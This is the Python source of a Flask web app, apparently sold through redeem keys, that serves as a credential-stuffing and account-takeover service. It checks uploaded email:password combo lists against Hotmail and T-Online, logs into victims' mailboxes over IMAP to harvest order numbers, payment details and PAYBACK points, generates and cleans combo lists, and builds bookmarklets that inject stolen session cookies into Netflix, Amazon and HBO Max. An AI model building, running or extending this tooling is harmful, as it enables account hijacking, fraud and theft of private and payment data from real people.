from flask import Flask, render_template, request, redirect, url_for, session, jsonify, send_file
from markupsafe import escape
import os
import re
import json
import uuid
import datetime
import threading
import tempfile
import itertools
import sys

app = Flask(__name__)
app.secret_key = os.urandom(24).hex()

REDEEM_CODES_FILE = "redeem_codes.json"
USERS_DB_JSON = "users_database.json"
UPLOAD_FOLDER = tempfile.mkdtemp()

_download_registry = {}
_registry_lock = threading.Lock()

def _register_download(session_key, filepath, filename):
    download_id = uuid.uuid4().hex[:16]
    with _registry_lock:
        _download_registry[download_id] = {
            'owner': session_key,
            'filepath': filepath,
            'filename': filename,
            'created': datetime.datetime.now()
        }
    return download_id

def _get_main_module():
    if '__main__' in sys.modules:
        return sys.modules['__main__']
    return None

def load_redeem_codes():
    if os.path.exists(REDEEM_CODES_FILE):
        try:
            with open(REDEEM_CODES_FILE, 'r') as f:
                return json.load(f)
        except:
            return {}
    return {}

def save_redeem_codes(codes):
    with open(REDEEM_CODES_FILE, 'w') as f:
        json.dump(codes, f, indent=2)

def load_json_users():
    if os.path.exists(USERS_DB_JSON):
        try:
            with open(USERS_DB_JSON, 'r', encoding='utf-8') as f:
                return json.load(f)
        except:
            return {"users": []}
    return {"users": []}

def _calc_expiry(used_at_str, vip_duration):
    if vip_duration == 'forever':
        return None
    try:
        used_at = datetime.datetime.strptime(used_at_str, "%Y-%m-%d %H:%M:%S")
    except:
        return None
    delta_map = {
        '1h': datetime.timedelta(hours=1),
        '1d': datetime.timedelta(days=1),
        '1w': datetime.timedelta(weeks=1),
        '1m': datetime.timedelta(days=30),
    }
    delta = delta_map.get(vip_duration)
    if not delta:
        return None
    return used_at + delta

def is_key_expired(key):
    codes = load_redeem_codes()
    if key not in codes:
        return True
    code_data = codes[key]
    vip_duration = code_data.get('vip_duration', '1d')
    if vip_duration == 'forever':
        return False
    used_at_str = code_data.get('used_at')
    if not used_at_str:
        return True
    expiry = _calc_expiry(used_at_str, vip_duration)
    if not expiry:
        return True
    return datetime.datetime.now() > expiry

def get_session_info():
    key = session.get('key')
    if not key:
        return None
    codes = load_redeem_codes()
    if key not in codes:
        return None
    code_data = codes[key]
    vip_duration = code_data.get('vip_duration', '1d')

    if is_key_expired(key):
        return None

    used_at_str = code_data.get('used_at', '')
    expiry = _calc_expiry(used_at_str, vip_duration)

    if vip_duration == 'forever':
        vip_display = 'Forever'
    elif expiry:
        remaining = expiry - datetime.datetime.now()
        hours = int(remaining.total_seconds() // 3600)
        minutes = int((remaining.total_seconds() % 3600) // 60)
        if hours > 24:
            days = hours // 24
            vip_display = f'{days}d {hours % 24}h verbleibend'
        else:
            vip_display = f'{hours}h {minutes}m verbleibend'
    else:
        vip_display = vip_duration

    return {
        'key': key[:8] + '...',
        'membership': 'VIP',
        'vip_until': vip_display,
        'username': f'Web-{key[:6]}',
    }


@app.route('/ping')
def ping():
    return 'ok', 200


@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        key = request.form.get('key', '').strip().upper()
        if not key:
            return render_template('login.html', error="Bitte Key eingeben!")

        codes = load_redeem_codes()
        if key not in codes:
            return render_template('login.html', error="Ungueltiger Key!")

        code_data = codes[key]
        if code_data.get('used') and not code_data.get('web_session'):
            return render_template('login.html', error="Key wurde bereits verwendet!")

        if not code_data.get('used'):
            codes[key]['used'] = True
            codes[key]['web_session'] = True
            codes[key]['used_at'] = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            save_redeem_codes(codes)
        elif code_data.get('web_session'):
            pass
        else:
            return render_template('login.html', error="Key wurde bereits im Bot verwendet!")

        session['key'] = key
        session['logged_in'] = True
        return redirect(url_for('dashboard'))

    return render_template('login.html', error=None)

@app.route('/dashboard')
def dashboard():
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    key = session.get('key')
    if key and is_key_expired(key):
        session.clear()
        return redirect(url_for('login'))
    info = get_session_info()
    if not info:
        session.clear()
        return redirect(url_for('login'))
    return render_template('dashboard.html',
                         username=info['username'],
                         membership=info['membership'],
                         vip_until=info['vip_until'],
                         total_scans=0,
                         total_hits=0)

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('index'))


def _sanitize(text):
    return str(escape(text))


@app.route('/api/custom-inbox', methods=['POST'])
def api_custom_inbox():
    if not session.get('logged_in'):
        return jsonify({'error': 'Not authenticated'}), 401

    key = session.get('key')
    if key and is_key_expired(key):
        session.clear()
        return jsonify({'error': 'Key abgelaufen! Bitte neuen Key einloesen.'}), 403

    services_input = request.form.get('services', '').strip()
    mode = request.form.get('mode', 'single')
    file = request.files.get('file')

    if not file or not services_input:
        return jsonify({'error': 'Services und Datei erforderlich'}), 400

    if mode == 'single':
        services = [services_input.strip()]
    else:
        services = [s.strip() for s in services_input.split(',') if s.strip()]

    if not services:
        return jsonify({'error': 'Mindestens einen Service eingeben'}), 400

    main_mod = _get_main_module()
    if not main_mod:
        return jsonify({'error': 'Checker not available'}), 503

    try:
        check_account_auto = main_mod.check_account_auto
        _inbox_search_hotmail = main_mod._inbox_search_hotmail
        IMAP_DOMAINS = main_mod.IMAP_DOMAINS
        TOnlineChecker = main_mod.TOnlineChecker
    except AttributeError as e:
        return jsonify({'error': f'Missing function: {e}'}), 503

    content = file.read().decode('utf-8', errors='ignore')
    lines = content.strip().splitlines()

    combos = []
    for line in lines:
        line = line.strip()
        if not line or ':' not in line:
            continue
        parts = line.split(':', 1)
        email_addr, pw = parts[0].strip(), parts[1].strip()
        if pw and '@' in email_addr and '.' in email_addr.split('@')[-1]:
            combos.append((email_addr, pw))

    if not combos:
        return jsonify({'error': 'Keine gueltigen Combos gefunden'}), 400

    hits = []
    bads = []
    no_inbox = []
    errors_list = []

    for email_addr, pw in combos:
        try:
            result, provider = check_account_auto(email_addr, pw)
            if result.get('status') == 'RETRY':
                result, provider = check_account_auto(email_addr, pw)

            status = result.get('status', 'RETRY')

            if status == 'BAD':
                bads.append(f"{email_addr}:{pw}")
                continue
            if status != 'HIT':
                errors_list.append(f"{email_addr}:{pw}")
                continue

            main_mod_svc = _get_main_module()
            known_senders = getattr(main_mod_svc, 'KNOWN_SERVICE_SENDERS', {})
            found_services = []
            for svc in services:
                svc_lower = svc.lower().strip()
                found = False
                known = known_senders.get(svc_lower, [])

                if provider == 'tonline':
                    try:
                        if known:
                            for sender in known:
                                imap_res = TOnlineChecker.search_inbox(email_addr, pw, sender)
                                if imap_res:
                                    found = True
                                    break
                        else:
                            results_imap = TOnlineChecker.search_inbox(email_addr, pw, svc_lower)
                            if results_imap:
                                found = True
                            if not found:
                                results_imap2 = TOnlineChecker.search_inbox(email_addr, pw, svc_lower + ".de")
                                if results_imap2:
                                    found = True
                    except:
                        pass
                else:
                    token = result.get('token', '')
                    cid = result.get('cid', '')
                    if known:
                        for sender in known:
                            if _inbox_search_hotmail(token, cid, f'from:"{sender}"'):
                                found = True
                                break
                    else:
                        for query in [f'from:"{svc_lower}.com"', f'from:"{svc_lower}.de"']:
                            if _inbox_search_hotmail(token, cid, query):
                                found = True
                                break

                if found:
                    found_services.append(svc)

            if found_services:
                hit_line = f"{_sanitize(email_addr)}:{_sanitize(pw)} | {', '.join(_sanitize(s) for s in found_services)}"
                hits.append(hit_line)
            else:
                no_inbox.append(f"{email_addr}:{pw}")

        except Exception:
            errors_list.append(f"{email_addr}:{pw}")

    download_url = None
    if hits:
        svc_name = '_'.join(s.upper() for s in services[:3])
        fname = f"INBOX_{svc_name}_{uuid.uuid4().hex[:8]}.txt"
        fpath = os.path.join(UPLOAD_FOLDER, fname)
        with open(fpath, 'w') as f:
            f.write('\n'.join(hits))
        dl_id = _register_download(session.get('key'), fpath, fname)
        download_url = f"/api/download/{dl_id}"

    return jsonify({
        'services_display': ', '.join(services),
        'hits': hits,
        'hits_count': len(hits),
        'bads_count': len(bads),
        'no_inbox_count': len(no_inbox),
        'errors_count': len(errors_list),
        'download_url': download_url
    })


@app.route('/api/single-check', methods=['POST'])
def api_single_check():
    if not session.get('logged_in'):
        return jsonify({'error': 'Not authenticated'}), 401

    email = request.form.get('email', '').strip()
    password = request.form.get('password', '').strip()

    if not email or not password:
        return jsonify({'error': 'Email und Passwort erforderlich'}), 400

    try:
        main_mod = _get_main_module()
        if not main_mod or not hasattr(main_mod, 'check_account_auto'):
            return jsonify({'error': 'Checker not available'}), 503

        result, provider = main_mod.check_account_auto(email, password)
        status = result.get('status', 'RETRY')

        if status == 'HIT':
            services = [_sanitize(s) for s in result.get('services', [])]
            return jsonify({
                'status': 'HIT',
                'provider': _sanitize(provider),
                'services': services,
                'email': _sanitize(email)
            })
        elif status == 'BAD':
            return jsonify({'status': 'BAD', 'provider': _sanitize(provider)})
        else:
            return jsonify({'status': _sanitize(status), 'provider': _sanitize(provider)})
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@app.route('/api/inbox-check', methods=['POST'])
def api_inbox_check():
    if not session.get('logged_in'):
        return jsonify({'error': 'Not authenticated'}), 401

    service = request.form.get('service', '')
    file = request.files.get('file')

    if not file or not service:
        return jsonify({'error': 'Datei und Service erforderlich'}), 400

    main_mod = _get_main_module()
    if not main_mod:
        return jsonify({'error': 'Checker not available'}), 503

    try:
        check_account_auto = main_mod.check_account_auto
        INBOX_SERVICES = main_mod.INBOX_SERVICES
        _inbox_search_hotmail = main_mod._inbox_search_hotmail
        _hotmail_search_and_fetch = main_mod._hotmail_search_and_fetch
        extract_payment_from_text = main_mod.extract_payment_from_text
        IMAP_DOMAINS = main_mod.IMAP_DOMAINS
        import imaplib
        import email as email_module
    except AttributeError as e:
        return jsonify({'error': f'Missing function: {e}'}), 503

    if service not in INBOX_SERVICES:
        return jsonify({'error': f'Unbekannter Service: {service}'}), 400

    svc = INBOX_SERVICES[service]
    service_name = svc['name']
    tonline_senders = svc['tonline_senders']
    hotmail_queries = svc['hotmail_queries']
    order_regex = svc['order_regex']

    content = file.read().decode('utf-8', errors='ignore')
    lines = content.strip().splitlines()

    combos = []
    for line in lines:
        line = line.strip()
        if not line or ':' not in line:
            continue
        parts = line.split(':', 1)
        email_addr, pw = parts[0].strip(), parts[1].strip()
        if pw and '@' in email_addr and '.' in email_addr.split('@')[-1]:
            combos.append((email_addr, pw))

    if not combos:
        return jsonify({'error': 'Keine gueltigen Combos gefunden'}), 400

    hits = []
    bads = []
    no_inbox = []
    errors_list = []

    for email_addr, pw in combos:
        try:
            result, provider = check_account_auto(email_addr, pw)
            if result.get('status') == 'RETRY':
                result, provider = check_account_auto(email_addr, pw)

            status = result.get('status', 'RETRY')

            if status == 'BAD':
                bads.append(f"{email_addr}:{pw}")
                continue

            if status != 'HIT':
                errors_list.append(f"{email_addr}:{pw}")
                continue

            token = result.get('token')
            cid = result.get('cid')
            domain = email_addr.lower().split('@')[-1] if '@' in email_addr else ''
            found_inbox = False
            orders = []
            payments = []
            payback_points = []
            is_payback = svc.get("custom_handler") == "payback"

            if domain in IMAP_DOMAINS:
                imap_host = IMAP_DOMAINS[domain]
                try:
                    mail = imaplib.IMAP4_SSL(imap_host)
                    mail.login(email_addr, pw)
                    for folder in ['INBOX', 'Spam', 'Junk']:
                        try:
                            mail.select(folder)
                        except:
                            continue
                        for sender in tonline_senders:
                            try:
                                _, msg_nums = mail.search(None, f'(FROM "{sender}")')
                                if msg_nums[0]:
                                    found_inbox = True
                                    nums = msg_nums[0].split()
                                    for num in nums[-3:]:
                                        _, msg_data = mail.fetch(num, '(RFC822)')
                                        raw = msg_data[0][1]
                                        msg = email_module.message_from_bytes(raw)
                                        body = ""
                                        if msg.is_multipart():
                                            for part in msg.walk():
                                                if part.get_content_type() == 'text/plain':
                                                    try:
                                                        body = part.get_payload(decode=True).decode('utf-8', errors='ignore')
                                                    except:
                                                        pass
                                                    break
                                        else:
                                            try:
                                                body = msg.get_payload(decode=True).decode('utf-8', errors='ignore')
                                            except:
                                                pass
                                        combined = msg.get('Subject', '') + ' ' + body
                                        if is_payback:
                                            for pm in re.findall(r'(\d[\d\.,]*)\s*(?:Punkte|Points|PAYBACK\s*Punkte)', combined, re.IGNORECASE):
                                                pts = pm.replace(".", "").replace(",", "")
                                                if pts.isdigit() and int(pts) > 0 and pts not in payback_points:
                                                    payback_points.append(pts)
                                            for pm in re.findall(r'(?:Punktestand|Kontostand|Guthaben|aktuell)[:\s]*(\d[\d\.,]*)', combined, re.IGNORECASE):
                                                pts = pm.replace(".", "").replace(",", "")
                                                if pts.isdigit() and int(pts) > 0 and pts not in payback_points:
                                                    payback_points.append(pts)
                                        else:
                                            order_match = re.search(order_regex, combined, re.IGNORECASE)
                                            if order_match and order_match.group(1) not in orders:
                                                orders.append(order_match.group(1))
                                        found_pay = extract_payment_from_text(combined)
                                        for p in found_pay:
                                            if p not in payments:
                                                payments.append(p)
                            except:
                                continue
                    mail.logout()
                except:
                    pass
            else:
                if token and cid:
                    for q in hotmail_queries:
                        if _inbox_search_hotmail(token, cid, q):
                            found_inbox = True
                            fetched = _hotmail_search_and_fetch(token, cid, q, size=10 if is_payback else 5)
                            for item in fetched:
                                combined = item.get('subject', '') + ' ' + item.get('body', '')
                                if is_payback:
                                    for pm in re.findall(r'(\d[\d\.,]*)\s*(?:Punkte|Points|PAYBACK\s*Punkte)', combined, re.IGNORECASE):
                                        pts = pm.replace(".", "").replace(",", "")
                                        if pts.isdigit() and int(pts) > 0 and pts not in payback_points:
                                            payback_points.append(pts)
                                    for pm in re.findall(r'(?:Punktestand|Kontostand|Guthaben|aktuell)[:\s]*(\d[\d\.,]*)', combined, re.IGNORECASE):
                                        pts = pm.replace(".", "").replace(",", "")
                                        if pts.isdigit() and int(pts) > 0 and pts not in payback_points:
                                            payback_points.append(pts)
                                else:
                                    order_match = re.search(order_regex, combined, re.IGNORECASE)
                                    if order_match and order_match.group(1) not in orders:
                                        orders.append(order_match.group(1))
                                found_pay = extract_payment_from_text(combined)
                                for p in found_pay:
                                    if p not in payments:
                                        payments.append(p)
                            break

            if found_inbox:
                hit_line = f"{_sanitize(email_addr)}:{_sanitize(pw)}"
                if is_payback and payback_points:
                    max_pts = max((int(p) for p in payback_points), default=0)
                    hit_line += f" | PAYBACK Punkte: {max_pts}"
                elif is_payback:
                    hit_line += f" | PAYBACK ✅"
                else:
                    if orders:
                        hit_line += f" | Orders: {', '.join(_sanitize(o) for o in orders[:3])}"
                    if payments:
                        hit_line += f" | Payment: {', '.join(_sanitize(p) for p in payments[:3])}"
                hits.append(hit_line)
            else:
                no_inbox.append(f"{email_addr}:{pw}")

        except Exception:
            errors_list.append(f"{email_addr}:{pw}")

    download_url = None
    if hits:
        fname = f"{service.upper()}_HITS_{uuid.uuid4().hex[:8]}.txt"
        fpath = os.path.join(UPLOAD_FOLDER, fname)
        with open(fpath, 'w') as f:
            f.write('\n'.join(hits))
        dl_id = _register_download(session.get('key'), fpath, fname)
        download_url = f"/api/download/{dl_id}"

    return jsonify({
        'hits': hits,
        'hits_count': len(hits),
        'bads_count': len(bads),
        'no_inbox_count': len(no_inbox),
        'errors_count': len(errors_list),
        'download_url': download_url
    })


@app.route('/api/combo-gen', methods=['POST'])
def api_combo_gen():
    if not session.get('logged_in'):
        return jsonify({'error': 'Not authenticated'}), 401

    emails_file = request.files.get('emails')
    passwords_file = request.files.get('passwords')

    if not emails_file or not passwords_file:
        return jsonify({'error': 'Beide Dateien erforderlich'}), 400

    emails = [l.strip() for l in emails_file.read().decode('utf-8', errors='ignore').splitlines() if l.strip()]
    passwords = [l.strip() for l in passwords_file.read().decode('utf-8', errors='ignore').splitlines() if l.strip()]

    if not emails or not passwords:
        return jsonify({'error': 'Leere Dateien'}), 400

    combos = [f"{e}:{p}" for e, p in itertools.product(emails, passwords)]
    total = len(combos)

    fname = f"COMBOS_{uuid.uuid4().hex[:8]}.txt"
    fpath = os.path.join(UPLOAD_FOLDER, fname)
    with open(fpath, 'w') as f:
        f.write('\n'.join(combos))

    dl_id = _register_download(session.get('key'), fpath, f"COMBOS_{len(emails)}mails_{len(passwords)}pw_{total}total.txt")

    return jsonify({
        'total': total,
        'emails_count': len(emails),
        'passwords_count': len(passwords),
        'download_url': f"/api/download/{dl_id}"
    })


@app.route('/api/combo-clean', methods=['POST'])
def api_combo_clean():
    if not session.get('logged_in'):
        return jsonify({'error': 'Not authenticated'}), 401

    file = request.files.get('file')
    if not file:
        return jsonify({'error': 'Datei erforderlich'}), 400

    lines = file.read().decode('utf-8', errors='ignore').splitlines()
    before = len(lines)

    clean = []
    seen = set()
    for line in lines:
        line = line.strip()
        if not line or ':' not in line:
            continue
        parts = line.split(':', 1)
        email_addr = parts[0].strip().lower()
        pw = parts[1].strip()
        if not pw or '@' not in email_addr:
            continue
        key = f"{email_addr}:{pw}"
        if key not in seen:
            seen.add(key)
            clean.append(f"{email_addr}:{pw}")

    after = len(clean)
    removed = before - after

    fname = f"CLEAN_{uuid.uuid4().hex[:8]}.txt"
    fpath = os.path.join(UPLOAD_FOLDER, fname)
    with open(fpath, 'w') as f:
        f.write('\n'.join(clean))

    dl_id = _register_download(session.get('key'), fpath, f"CLEAN_{after}lines.txt")

    return jsonify({
        'before': before,
        'after': after,
        'removed': removed,
        'download_url': f"/api/download/{dl_id}"
    })


@app.route('/api/mail-extract', methods=['POST'])
def api_mail_extract():
    if not session.get('logged_in'):
        return jsonify({'error': 'Not authenticated'}), 401

    file = request.files.get('file')
    if not file:
        return jsonify({'error': 'Datei erforderlich'}), 400

    content = file.read().decode('utf-8', errors='ignore')
    emails_found = list(set(re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', content)))
    emails_found.sort()

    fname = f"EMAILS_{uuid.uuid4().hex[:8]}.txt"
    fpath = os.path.join(UPLOAD_FOLDER, fname)
    with open(fpath, 'w') as f:
        f.write('\n'.join(emails_found))

    dl_id = _register_download(session.get('key'), fpath, f"EMAILS_{len(emails_found)}.txt")

    return jsonify({
        'count': len(emails_found),
        'download_url': f"/api/download/{dl_id}"
    })


_COOKIE_SESSIONS_FILE = "_cookie_sessions.json"
_cookie_sessions_lock = threading.Lock()

def _get_cookie_session(token):
    try:
        with _cookie_sessions_lock:
            if os.path.exists(_COOKIE_SESSIONS_FILE):
                with open(_COOKIE_SESSIONS_FILE, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                return data.get(token)
    except Exception:
        pass
    return None

_SERVICE_CONFIG = {
    "netflix": {
        "name": "Netflix",
        "emoji": "🎬",
        "color": "#e50914",
        "bg": "#141414",
        "pc_url": "https://www.netflix.com/browse",
        "phone_url": "https://www.netflix.com/browse",
        "cookie_domain": ".netflix.com",
    },
    "amazon": {
        "name": "Amazon",
        "emoji": "📦",
        "color": "#ff9900",
        "bg": "#131921",
        "pc_url": "https://www.amazon.com/",
        "phone_url": "https://www.amazon.com/",
        "cookie_domain": ".amazon.com",
    },
    "hbomax": {
        "name": "HBO Max",
        "emoji": "🎬",
        "color": "#0066cc",
        "bg": "#00003c",
        "pc_url": "https://www.max.com/",
        "phone_url": "https://www.max.com/",
        "cookie_domain": ".max.com",
    },
}

@app.route('/cl/<token>/<device>')
def cookie_login_page(token, device):
    entry = _get_cookie_session(token)
    if not entry:
        return ("<h2 style='font-family:Arial;text-align:center;margin-top:20vh;"
                "color:#e50914'>\u274c Link expired or invalid."
                "<br><small>Generate a new link from the bot.</small></h2>"), 404

    service     = entry.get("service", "netflix")
    cookies_list = entry.get("cookies", [])
    cfg          = _SERVICE_CONFIG.get(service, _SERVICE_CONFIG["netflix"])
    target_url   = cfg["phone_url"] if device == "phone" else cfg["pc_url"]
    domain       = cfg["cookie_domain"]

    # Build the JS injection payload (one-liner)
    cookie_lines = []
    for c in cookies_list:
        n  = c.get("name",  "").replace("\\", "\\\\").replace("'", "\\'")
        v  = c.get("value", "").replace("\\", "\\\\").replace("'", "\\'")
        p  = c.get("path",  "/").replace("'", "\\'")
        sc = "secure;" if c.get("secure") else ""
        cookie_lines.append(
            "document.cookie='%s=%s;path=%s;domain=%s;%sSameSite=None';" % (n, v, p, domain, sc)
        )
    js_payload  = " ".join(cookie_lines) + " location.reload();"
    bookmarklet = "javascript:(function(){" + js_payload + "})();"

    import html as _html
    bookmarklet_attr = _html.escape(bookmarklet)

    cookie_count  = len(cookies_list)
    device_label  = "\U0001f4f1 Phone" if device == "phone" else "\U0001f4bb PC"
    svc_name      = cfg["name"]
    svc_color     = cfg["color"]
    svc_bg        = cfg["bg"]
    svc_emoji     = cfg["emoji"]
    done_border   = svc_color + "44"

    bm_json    = json.dumps(bookmarklet)
    scpt_json  = json.dumps(js_payload)
    saved_msg  = json.dumps("\u2705 Bookmark saved! Now open %s and click it." % svc_name)

    CSS = (
        "*{box-sizing:border-box;margin:0;padding:0}"
        "html,body{height:100%;font-family:\'Segoe UI\',Arial,sans-serif;color:#fff}"
        "body{display:flex;flex-direction:column;align-items:center;"
        "justify-content:center;min-height:100vh;padding:20px;"
        "background:" + svc_bg + "}"
        ".card{background:rgba(255,255,255,0.06);border-radius:22px;padding:34px 28px;"
        "max-width:560px;width:100%;text-align:center;box-shadow:0 16px 56px rgba(0,0,0,0.55)}"
        "h1{font-size:1.65rem;margin-bottom:6px;color:" + svc_color + "}"
        ".badge{display:inline-flex;align-items:center;gap:7px;background:rgba(255,255,255,0.09);"
        "padding:5px 16px;border-radius:20px;font-size:0.82rem;margin-bottom:26px;color:#ccc}"
        ".steps{display:flex;flex-direction:column;gap:16px;margin-bottom:28px;text-align:left}"
        ".step{display:flex;align-items:flex-start;gap:14px;background:rgba(0,0,0,0.28);"
        "border-radius:14px;padding:16px 18px;border:1px solid rgba(255,255,255,0.06)}"
        ".step.done{border-color:" + done_border + ";background:rgba(255,255,255,0.04)}"
        ".step-num{min-width:32px;height:32px;border-radius:50%;background:" + svc_color + ";"
        "color:#fff;display:flex;align-items:center;justify-content:center;"
        "font-weight:800;font-size:1rem;flex-shrink:0}"
        ".step.done .step-num{background:#2e7d32}"
        ".step-body{flex:1}"
        ".step-title{font-weight:700;font-size:0.97rem;margin-bottom:3px}"
        ".step-desc{font-size:0.82rem;color:#999;line-height:1.4}"
        ".bm-wrap{margin:12px 0 4px;display:flex;justify-content:center}"
        ".bm-btn{display:inline-flex;align-items:center;gap:8px;background:" + svc_color + ";"
        "color:#fff;padding:13px 24px;border-radius:12px;font-size:1rem;font-weight:700;"
        "text-decoration:none;cursor:grab;user-select:none;"
        "box-shadow:0 4px 20px " + svc_color + "55;animation:pulse 2s ease-in-out infinite}"
        "@keyframes pulse{0%,100%{box-shadow:0 4px 20px " + svc_color + "55}"
        "50%{box-shadow:0 4px 32px " + svc_color + "cc}}"
        ".bm-hint{font-size:0.78rem;color:#888;margin-top:6px}"
        ".go-btn{display:inline-flex;align-items:center;gap:9px;background:#222;"
        "border:2px solid " + svc_color + ";color:#fff;padding:13px 28px;border-radius:12px;"
        "font-size:1rem;font-weight:700;text-decoration:none;transition:all 0.2s;margin-top:4px}"
        ".go-btn:hover{background:" + svc_color + ";transform:translateY(-2px)}"
        ".mobile-box{background:rgba(0,0,0,0.35);border-radius:12px;padding:14px 16px;"
        "margin-top:20px;font-size:0.82rem;color:#aaa;text-align:left;display:none}"
        ".mobile-box b{color:#ddd}"
        ".copy-btn{display:inline-block;margin-top:10px;background:#333;color:#fff;"
        "border:1px solid #555;padding:7px 16px;border-radius:8px;cursor:pointer;font-size:0.82rem}"
        ".toast{position:fixed;top:20px;left:50%;transform:translateX(-50%);"
        "background:#1b5e20;color:#fff;padding:10px 26px;border-radius:30px;"
        "font-size:0.92rem;font-weight:600;opacity:0;transition:opacity 0.4s;"
        "z-index:999;pointer-events:none;white-space:nowrap}"
        ".toast.show{opacity:1}"
        "@media(max-width:500px){.card{padding:24px 14px}"
        ".bm-btn,.go-btn{width:100%;justify-content:center}.mobile-box{display:block}}"
    )

    JS = (
        "var BM=" + bm_json + ";"
        "var SCPT=" + scpt_json + ";"
        "function toast(m,d){var t=document.getElementById('toast');"
        "t.textContent=m;t.classList.add('show');clearTimeout(t._i);"
        "t._i=setTimeout(function(){t.classList.remove('show');},d||2500);}"
        "function markDragged(){"
        "document.getElementById('s1').classList.add('done');"
        "document.getElementById('s1').querySelector('.step-num').textContent='\u2713';"
        "toast(" + saved_msg + ",3000);}"
        "function copyBm(){navigator.clipboard.writeText(BM).then(function(){"
        "toast('\U0001f4cb URL copied! Create a bookmark and paste as its URL.',3500);"
        "}).catch(function(){toast('\u26a0\ufe0f Copy failed \u2014 try dragging',2500);});}"
        "function copyScript(){navigator.clipboard.writeText(SCPT).then(function(){"
        "toast('\u2705 Script copied!',2500);"
        "}).catch(function(){toast('\u26a0\ufe0f Copy failed',2000);});}"
        "if(/Android|iPhone|iPad|iPod/i.test(navigator.userAgent)){"
        "document.querySelector('.mobile-box').style.display='block';}"
    )

    page = (
        "<!DOCTYPE html><html lang=\"en\"><head>"
        "<meta charset=\"UTF-8\">"
        "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">"
        "<title>" + svc_name + " Cookie Login</title>"
        "<style>" + CSS + "</style>"
        "</head><body>"
        "<div class=\"toast\" id=\"toast\"></div>"
        "<div class=\"card\">"
        "  <h1>" + svc_emoji + " " + svc_name + " Cookie Login</h1>"
        "  <div class=\"badge\">\U0001f36a " + str(cookie_count) + " cookies &nbsp;&middot;&nbsp; " + device_label + "</div>"
        "  <div class=\"steps\">"

        "    <div class=\"step\" id=\"s1\">"
        "      <div class=\"step-num\">1</div>"
        "      <div class=\"step-body\">"
        "        <div class=\"step-title\">Drag button to Bookmarks Bar</div>"
        "        <div class=\"step-desc\">Hold and drag the button below into your browser bookmarks bar"
        " &mdash; one time only! (Press Ctrl+Shift+B to show the bar)</div>"
        "        <div class=\"bm-wrap\">"
        "          <a class=\"bm-btn\" id=\"bm-link\" href=\"" + bookmarklet_attr + "\"  "
        "             ondragstart=\"markDragged()\" onclick=\"return false;\">"
        "            \U0001f511 " + svc_name + " Auto Login"
        "          </a>"
        "        </div>"
        "        <div class=\"bm-hint\">\u2191 Drag into bookmarks bar &nbsp;|&nbsp;"
        " <span style=\"color:" + svc_color + ";cursor:pointer\" onclick=\"copyBm()\">Or copy URL</span></div>"
        "      </div>"
        "    </div>"

        "    <div class=\"step\" id=\"s2\">"
        "      <div class=\"step-num\">2</div>"
        "      <div class=\"step-body\">"
        "        <div class=\"step-title\">Open " + svc_name + "</div>"
        "        <div class=\"step-desc\">Click below to open " + svc_name + " in this tab.</div>"
        "        <div style=\"margin-top:10px\">"
        "          <a class=\"go-btn\" href=\"" + target_url + "\">\U0001f310 Open " + svc_name + "</a>"
        "        </div>"
        "      </div>"
        "    </div>"

        "    <div class=\"step\" id=\"s3\">"
        "      <div class=\"step-num\">3</div>"
        "      <div class=\"step-body\">"
        "        <div class=\"step-title\">Click the bookmark on " + svc_name + "</div>"
        "        <div class=\"step-desc\">On the " + svc_name + " page, click"
        " <b>\U0001f511 " + svc_name + " Auto Login</b> in your bookmarks bar."
        "<br>Cookies inject automatically &mdash; page reloads and you're logged in \u2705</div>"
        "      </div>"
        "    </div>"

        "  </div>"
        "  <div class=\"mobile-box\">"
        "    <b>\U0001f4f1 Mobile:</b> Drag doesn't work on mobile. Instead:<br>"
        "    1. Copy the script<br>"
        "    2. Open " + svc_name + " &rarr; tap address bar &rarr; type <code>javascript:</code>"
        " then paste &amp; press Go<br>"
        "    <button class=\"copy-btn\" onclick=\"copyScript()\">\U0001f4cb Copy Injection Script</button>"
        "  </div>"
        "</div>"
        "<script>" + JS + "</script>"
        "</body></html>"
    )
    return page


@app.route('/api/download/<download_id>')
def api_download(download_id):
    if not session.get('logged_in'):
        return redirect(url_for('login'))

    with _registry_lock:
        entry = _download_registry.get(download_id)

    if not entry:
        return "File not found", 404

    if entry['owner'] != session.get('key'):
        return "Access denied", 403

    fpath = entry['filepath']
    if os.path.exists(fpath):
        return send_file(fpath, as_attachment=True, download_name=entry['filename'])
    return "File not found", 404


def start_web_server(port=5000):
    import socket as _socket
    from werkzeug.serving import make_server

    # Pre-create socket with SO_REUSEADDR + SO_REUSEPORT so instant restarts
    # never fail to bind even if TIME_WAIT sockets are still lingering.
    for _attempt in range(20):
        try:
            _sock = _socket.socket(_socket.AF_INET, _socket.SOCK_STREAM)
            _sock.setsockopt(_socket.SOL_SOCKET, _socket.SO_REUSEADDR, 1)
            try:
                _sock.setsockopt(_socket.SOL_SOCKET, _socket.SO_REUSEPORT, 1)
            except (AttributeError, OSError):
                pass
            _sock.bind(('0.0.0.0', port))
            _sock.listen(128)
            break
        except OSError:
            _sock.close()
            import time as _t
            _t.sleep(0.05)  # 50 ms retry — port released within ~1 s total
    else:
        # Absolute fallback — let Flask handle it
        app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)
        return

    server = make_server('0.0.0.0', port, app, fd=_sock.fileno())
    _sock.close()  # make_server duplicates the fd
    server.serve_forever()
